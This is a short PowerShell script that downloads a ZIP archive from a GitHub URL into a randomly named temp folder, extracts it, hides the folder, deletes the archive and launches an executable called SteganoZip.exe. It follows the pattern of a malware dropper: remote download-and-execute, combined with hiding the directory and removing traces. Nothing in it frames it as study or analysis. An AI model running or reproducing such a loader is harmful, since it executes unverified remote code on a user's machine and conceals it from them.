$url = "https://github.com/cuunon9x/ghe/blob/main/ConsoleApp2.zip"
$dir = [System.Guid]::NewGuid().ToString()
$zipPath = "$env:temp\$dir.zip"
$extractPath = "$env:temp\$dir"

# Download the file
(New-Object Net.WebClient).DownloadFile($url, $zipPath)

# Create the extraction directory
New-Item -Path $extractPath -ItemType Directory

# Extract the ZIP file
Expand-Archive -LiteralPath $zipPath -DestinationPath $extractPath

# Hide the directory
attrib +h $extractPath

# Remove the ZIP file
Remove-Item $zipPath

# Optional sleep (depending on what you're waiting for)
Start-Sleep -Seconds 3

# Change location to the extracted directory
Set-Location -Path $extractPath

# Start SteganoZip (Ensure this executable exists in the extracted folder)
Start-Process "$extractPath\SteganoZip.exe"
